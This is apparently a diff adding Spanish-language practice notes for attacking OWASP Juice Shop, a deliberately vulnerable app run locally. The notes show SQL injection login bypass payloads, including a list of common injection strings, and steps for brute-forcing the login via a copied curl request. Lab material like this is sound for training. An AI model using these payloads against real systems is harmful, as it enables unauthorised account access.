@@ -1,0 +1,54 @@
+++ URL: https://github.com/juice-shop/juice-shop
+--- Nota: esta web app se trata de una web app vulnerable destinada a realizar pruebas y prácticas
+
+++ Ejecutar en terminal lo siguiente para proceder a la instalación:
+--- docker pull bkimminich/juice-shop
+--- docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
+
+++ Acceder a la interfaz web mediante:
+--- http://localhost:3000
+
+++ Ataque #1 SQL Injection
+--- URL de Referencia: https://github.com/payloadbox/sql-injection-payload-list
+--- Login email: bender@juice-sh.op'-- pasword: <cualquier_caracter> 
+--- Login email: admin@juice-sh.op'-- password: <cualquier_caracter>
+---- Nota: Los caracteres '-- después del correo hacen referencia al payload que nos permite realizar la injección sql y
+obtener el acceso usando cualquier contraseña
+---- Nota: Es posible usar otros payloads para comprobar cual de ellos funciona, listado de los payloads más comunes:
+    '
+    ''
+    `
+    ``
+    ,
+    "
+    ""
+    /
+    //
+    \
+    \\
+    ;
+    ' or "
+    -- or # 
+    ' OR '1
+    ' OR 1 -- -
+    " OR "" = "
+    " OR 1 = 1 -- -
+    ' OR '' = '
+    '='
+    'LIKE'
+    '=0--+
+     OR 1=1
+    ' OR 'x'='x
+    ' AND id IS NULL; --
+
+++ Ataque #2 Brute Force
+--- Verificar la sección de network dentro de developer tools en firefox, podemos también entrar usando la combinación
+de teclas Ctrl + Shift + i
+--- El objetivo es estando en la página de login ingresar una contraseña (email: admin@juice-sh.op - password: <cualquiera>
+--- Estando en la sección de Network copiar el intento de inicio de sesión (POST Request) como curl
+---- Nota: a la derecha en la sección request nos aparecerán los parámetros asociados a la solicitud, en este caso son dos: email 
+y password
+--- Ir a la terminal de Kali y copiar el texto
+--- Al presionar enter nos indicará: invalid password, no obstante este código nos sirve para automatizar y 
+probar contraseñas, hemos incluido el código para realizar tal automatización en python (BruteForce.py)
+
